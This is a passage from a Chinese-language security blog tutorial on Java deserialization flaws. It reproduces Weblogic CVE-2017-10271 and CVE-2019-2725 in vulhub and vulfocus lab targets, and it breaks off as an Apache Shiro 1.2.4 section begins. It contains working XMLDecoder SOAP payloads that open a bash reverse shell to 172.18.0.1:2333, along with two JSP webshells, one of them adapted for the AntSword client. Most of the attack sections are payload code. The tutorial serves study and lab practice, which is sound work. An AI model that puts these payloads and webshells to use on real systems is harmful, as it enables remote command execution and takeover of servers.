class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应如下代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>XML多参数Payload构造</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>17.0.8<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.beans.XMLDecoder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">length</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>/bin/bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>open -a Calculator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、java反序列化漏洞的使用"><a href="#四、java反序列化漏洞的使用" class="headerlink" title="四、java反序列化漏洞的使用"></a>四、java反序列化漏洞的使用</h2><h3 id="4-1-Weblogic反序列化漏洞-CVE-2017-10271"><a href="#4-1-Weblogic反序列化漏洞-CVE-2017-10271" class="headerlink" title="4.1 Weblogic反序列化漏洞(CVE-2017-10271)"></a>4.1 Weblogic反序列化漏洞(<strong>CVE-2017-10271</strong>)</h3><h4 id="4-1-1-什么是Weblogic"><a href="#4-1-1-什么是Weblogic" class="headerlink" title="4.1.1 什么是Weblogic"></a>4.1.1 什么是Weblogic</h4><p><a href="https://baike.baidu.com/item/weblogic/451978?fr=ge_ala">百度百科</a>：</p><p>WebLogic是<a href="https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BDOracle%E5%85%AC%E5%8F%B8/9952086?fromModule=lemma_inlink">美国Oracle公司</a>出品的一个application server，确切的说是一个基于<a href="https://baike.baidu.com/item/JAVAEE/3066623?fromModule=lemma_inlink">JAVAEE</a>架构的<a href="https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6/452240?fromModule=lemma_inlink">中间件</a>，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/2196523?fromModule=lemma_inlink">网络应用</a>和<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/10563731?fromModule=lemma_inlink">数据库应用</a>的<a href="https://baike.baidu.com/item/Java/85979?fromModule=lemma_inlink">Java</a>应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p><p><strong>WebLogic</strong>是美商<a href="https://baike.baidu.com/item/Oracle/301207?fromModule=lemma_inlink">Oracle</a>的主要产品之一，是并购BEA得来。是商业市场上主要的Java（J2EE）应用<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BD%AF%E4%BB%B6/3925998?fromModule=lemma_inlink">服务器软件</a>（application server）之一，是世界上第一个成功商业化的<a href="https://baike.baidu.com/item/J2EE%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/12678909?fromModule=lemma_inlink">J2EE应用服务器</a>, 已推出到12c(12.2.1.4) 版。而此产品也延伸出[WebLogic Portal](<a href="https://baike.baidu.com/item/WebLogic">https://baike.baidu.com/item/WebLogic</a> Portal/172525?fromModule=lemma_inlink)，WebLogic Integration等企业用的<a href="https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6/452240?fromModule=lemma_inlink">中间件</a>（但当下Oracle主要以Fusion Middleware融合中间件来取代这些[WebLogic Server](<a href="https://baike.baidu.com/item/WebLogic">https://baike.baidu.com/item/WebLogic</a> Server/7625043?fromModule=lemma_inlink)之外的企业包），以及OEPE(Oracle Enterprise Pack for Eclipse)<a href="https://baike.baidu.com/item/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/10464557?fromModule=lemma_inlink">开发工具</a>。</p><h4 id="4-1-2-漏洞简介"><a href="#4-1-2-漏洞简介" class="headerlink" title="4.1.2 漏洞简介"></a>4.1.2 漏洞简介</h4><p>漏洞编号为<strong>CVE-2017-10271</strong></p><p><strong>影响版本</strong>：Weblogic10.3.6.0，12.1.3.0，12.2.1.0，12.2.1.1和12.2.1.2</p><p><strong>漏洞位置</strong>：wls-wsat.war</p><p><strong>漏洞URL</strong>：/wls-wsat/CoordinatorPortType(POST)</p><p><strong>漏洞的本质</strong>：构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞。</p><h4 id="4-1-3-漏洞复现"><a href="#4-1-3-漏洞复现" class="headerlink" title="4.1.3 漏洞复现"></a>4.1.3 漏洞复现</h4><p>靶场来源于：<a href="https://github.com/vulhub/vulhub/tree/master">vulhub</a></p><h5 id="4-1-3-1-手工攻击"><a href="#4-1-3-1-手工攻击" class="headerlink" title="4.1.3.1 手工攻击"></a>4.1.3.1 手工攻击</h5><p>构造Payload如下</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soapenv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">work:</span>WorkContext</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>work</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://bea.com/2004/06/soap/workarea/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.4.0<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.beans.XMLDecoder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">length</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>/bin/bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>                                bash -i <span class="token entity named-entity" title=">">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span> /dev/tcp/172.18.0.1/2333 0<span class="token entity named-entity" title=">">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span>1                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">work:</span>WorkContext</span><span class="token punctuation">&gt;</span></span>/    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Body</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Envelope</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述将&gt;和&amp;符号编码的原因是防止java解析不出来而被过滤掉，也可在<a href="https://jackson-t.com/java.lang.runtime.exec-payload-workarounds/">这里</a>进行Base64编码</p><p>访问漏洞页面，发现如下页面说明可能存在漏洞</p><p><img src="/../image/image-20240316221420586.png" alt="image-20240316221420586"></p><p>使用dnslog来判断是否存在漏洞，让机器去ping我们申请的DNS服务器，查看是否有记录</p><p><img src="/../image/image-20240316222954338.png" alt="image-20240316222954338"></p><p><img src="/../image/image-20240316223338758.png" alt="image-20240316223338758"></p><p><img src="/../image/image-20240316223401477.png" alt="image-20240316223401477"></p><p>说明漏洞存在，接下来反弹shell，成功</p><p><img src="/../image/image-20240316223712612.png" alt="image-20240316223712612"></p><h5 id="4-1-3-2-利用工具"><a href="#4-1-3-2-利用工具" class="headerlink" title="4.1.3.2 利用工具"></a>4.1.3.2 利用工具</h5><p><a href="https://github.com/shack2/javaserializetools/releases/tag/1.0.20190828">Java反序列化漏洞利用工具V1.7 20190828</a></p><p>打开工具测试网页是否存在漏洞</p><p><img src="/../image/image-20240317162338608.png" alt="image-20240317162338608"></p><p>上传jsp木马</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%if("x".equals(request.getParameter("pwd")))    {        java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();        int a = -1;        byte[] b = new byte[2048];        out.print("&lt;pre&gt;");        while((a=in.read(b))!=-1)        {            out.println(new String(b));        }        out.print("&lt;/pre&gt;");    }%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../image/image-20240317163134778.png" alt="image-20240317163134778"></p><p><img src="/../image/image-20240317163156437.png" alt="image-20240317163156437"></p><p>使用蚁剑连接需要修改代码</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%!    class U extends ClassLoader {        U(ClassLoader c) {            super(c);        }        public Class g(byte[] b) {            return super.defineClass(b, 0, b.length);        }    }     public byte[] base64Decode(String str) throws Exception {        try {            Class clazz = Class.forName("sun.misc.BASE64Decoder");            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);        } catch (Exception e) {            Class clazz = Class.forName("java.util.Base64");            Object decoder = clazz.getMethod("getDecoder").invoke(null);            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);        }    }%&gt;&lt;%    String cls = request.getParameter("pwd");    if (cls != null) {        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);    }%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../image/image-20240317164303805.png" alt="image-20240317164303805"></p><h3 id="4-2-Weblogic反序列化漏洞-CVE-2019-2725"><a href="#4-2-Weblogic反序列化漏洞-CVE-2019-2725" class="headerlink" title="4.2 Weblogic反序列化漏洞(CVE-2019-2725)"></a>4.2 Weblogic反序列化漏洞(<strong>CVE-2019-2725</strong>)</h3><h4 id="4-2-1-漏洞简介"><a href="#4-2-1-漏洞简介" class="headerlink" title="4.2.1 漏洞简介"></a>4.2.1 漏洞简介</h4><p>漏洞编号为<strong>CVE-2019-2725</strong></p><p><strong>影响版本</strong>：Weblogic10.3.6.0，12.1.3.0</p><p><strong>漏洞URL</strong>：/_async/AsyncResponseService(POST)</p><p><strong>漏洞的本质</strong>：构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞。</p><h4 id="4-2-2-漏洞复现"><a href="#4-2-2-漏洞复现" class="headerlink" title="4.2.2 漏洞复现"></a>4.2.2 漏洞复现</h4><p>靶场来源于<a href="https://github.com/fofapro/vulfocus">vulfocus</a>，搭建可以参考链接5</p><h5 id="4-2-2-1-手工攻击"><a href="#4-2-2-1-手工攻击" class="headerlink" title="4.2.2.1 手工攻击"></a>4.2.2.1 手工攻击</h5><p>构造Payload如下</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soapenv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span>                  <span class="token attr-name"><span class="token namespace">xmlns:</span>wsa</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2005/08/addressing<span class="token punctuation">"</span></span>                  <span class="token attr-name"><span class="token namespace">xmlns:</span>asy</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.bea.com/async/AsyncResponseService<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">wsa:</span>Action</span><span class="token punctuation">&gt;</span></span>xx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">wsa:</span>Action</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">wsa:</span>RelatesTo</span><span class="token punctuation">&gt;</span></span>xx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">wsa:</span>RelatesTo</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">work:</span>WorkContext</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>work</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://bea.com/2004/06/soap/workarea/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.4.0<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.beans.XMLDecoder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">length</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>/bin/bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>                                bash -i <span class="token entity named-entity" title=">">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span> /dev/tcp/172.18.0.1/2333 0<span class="token entity named-entity" title=">">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span>1                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">work:</span>WorkContext</span><span class="token punctuation">&gt;</span></span>/    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Body</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">asy:</span>onAsyncDelivery</span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Envelope</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问漏洞页面，发现如下页面说明可能存在漏洞</p><p><img src="/../image/image-20240318091112578.png" alt="image-20240318091112578"></p><p>反弹shell</p><p><img src="/../image/image-20240318092619284.png" alt="image-20240318092619284"></p><h5 id="4-2-2-2-利用工具"><a href="#4-2-2-2-利用工具" class="headerlink" title="4.2.2.2 利用工具"></a>4.2.2.2 利用工具</h5><p>探测是否存在漏洞</p><p><img src="/../image/image-20240318092737270.png" alt="image-20240318092737270"></p><p>上传jsp木马</p><p><img src="/../image/image-20240318092825127.png" alt="image-20240318092825127"></p><p>使用蚁剑连接</p><p><img src="/../image/image-20240318092950729.png" alt="image-20240318092950729"></p><h3 id="4-3-Apache-Shiro-1-2-4-反序列化漏洞"><a href="#4-3-Apache-Shiro-1-2-4-反序列化漏洞" class="headerlink" title="4.3  Apache Shiro 1.2.4 反序列化漏洞"></a>4.3  Apache Shiro 1.2.4 反序列化漏洞</h3><h4 id="4-3-1-什么是Shiro"><a href="#4-3-1-什么是Shiro" class="headerlink" title="4.3.1 什么是Shiro"></a>4.3.1 什么是Shiro</h4><p><a href="https://baike.baidu.com/item/shiro/17753571?fr=ge_ala">百度百科</a></p><p><a href="https://baike.baidu.com/item/Apache/6265?fromModule=lemma_inlink">Apache</a> Shiro是一个强大且易用的<a href="https://baike.baidu.com/item/Java/85979?fromModule=lemma_inlink">Java</a>安全框架,执行<a href="https://baike.baidu.com/item/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/2193233?fromModule=lemma_inlink">身份验证</a>、授权、密码和<a href="https://baike.baidu.com/item/%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86/1447140?fromModule=lemma_inlink">会话管理</a>。使用Shiro的易于理解的<a href="https://baike.baidu.com/item/API/10154?fromModule=lemma_inlink">API</a>,您可以<a href="https://baike.baidu.com/item/%E5%BF%AB%E9%80%9F/33210?fromModule=lemma_inlink">快速</a>、轻松地获得任何<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/5985445?fromModule=lemma_inlink">应用程序</a>,从最小的移动应用程序到最大的网络和企业应用程序。</p><p><strong>主要功能</strong></p><p>三个核心组件：Subject, SecurityManager 和 Realms.</p><p>Subject：即“当前操作用户”。但是，在Shiro中，Subject这一概念并不仅仅指人，也可以是第三方进程、后台帐户（Daemon Account）或其他类似事物。它仅仅意味着“当前跟软件交互的东西”。</p><p>Subject代表了当前用户的安全操作，SecurityManager则管理所有用户的安全操作。</p><p>SecurityManager：它是Shiro框架的核心，典型的<a href="https://baike.baidu.com/item/Facade%E6%A8%A1%E5%BC%8F/7557140?fromModule=lemma_inlink">Facade模式</a>，Shiro通过SecurityManager来管理内部组件实例，并通过它来提供<a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86/5390196?fromModule=lemma_inlink">安全管理</a>的各种服务。</p><p>Realm： Realm充当了Shiro与<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/7429763?fromModule=lemma_inlink">应用安全</a>数据间的“桥梁”或者“连接器”。也就是说，当对用户执行认证（登录）和授权（<a href="https://baike.baidu.com/item/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/8545517?fromModule=lemma_inlink">访问控制</a>）验证时，Shiro会从应用配置的Realm中查找用户及其权限信息。</p><p>从这个意义上讲，Realm实质上是一个安全相关的<a href="https://baike.baidu.com/item/DAO/2900358?fromModule=lemma_inlink">DAO</a>：它封装了<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E6%BA%90/5198928?fromModule=lemma_inlink">数据源</a>的连接细节，并在需要时将相关数据提供给Shiro。当配置Shiro时，你必须至少指定一个Realm，用于认证和（或）授权。配置多个Realm是可以的，但是至少需要一个。</p><p>Shiro内置了可以连接大量安全数据源（又名目录）的Realm，如<a href="https://baike.baidu.com/item/LDAP/2875565?fromModule=lemma_inlink">LDAP</a>、关系数据库（JDBC）、类似<a href="https://baike.baidu.com/item/INI/9212321?fromModule=lemma_inlink">INI</a>的文本配置资源以及属性文件等。如果系统默认的Realm不能满足需求，你还可以插入代表自定义数据源的自己的Realm实现。</p><h4 id="4-3-2-漏洞简介"><a href="#4-3-2-漏洞简介" class="headerlink" title="4.3.2 漏洞简介"></a>4.3.2 漏洞简介</h4><p>Shiro 默认先接受用户提交的 